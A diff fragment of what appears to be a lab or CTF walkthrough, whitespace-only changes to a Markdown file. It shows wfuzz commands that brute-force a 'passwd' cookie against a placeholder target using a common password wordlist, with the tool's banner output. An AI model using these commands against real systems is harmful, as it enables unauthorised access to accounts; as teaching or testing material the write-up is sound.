@@ -8,7 +8,7 @@ root@attacker-machine:~# wfuzz -z \
 This will run though the word list of 10-million-password-list-top-500.txt and replace the cookie value, passwd, with the value from the wordlist and attempt to make a new HTTP request using that new cookie value. This will return a LOT of strings like so,
 ```
 ********************************************************
-* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+* Wfuzz 2.1.3 - The Web Bruteforcer                    *
 ********************************************************
 
 Target: http://(TARGET IP ADDRESS):(TARGET PORT)
@@ -44,7 +44,7 @@ root@attacker-machine:~# wfuzz --hh 324 -z \
  file,/infosec/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt\
  -b passwd=FUZZ http://(TARGET IP ADDRESS):(TARGET PORT) 
 ********************************************************
-* Wfuzz 2.1.3 - The Web Bruteforcer                      *
+* Wfuzz 2.1.3 - The Web Bruteforcer                    *
 ********************************************************
 
 Target: http://(TARGET IP ADDRESS):(TARGET PORT)
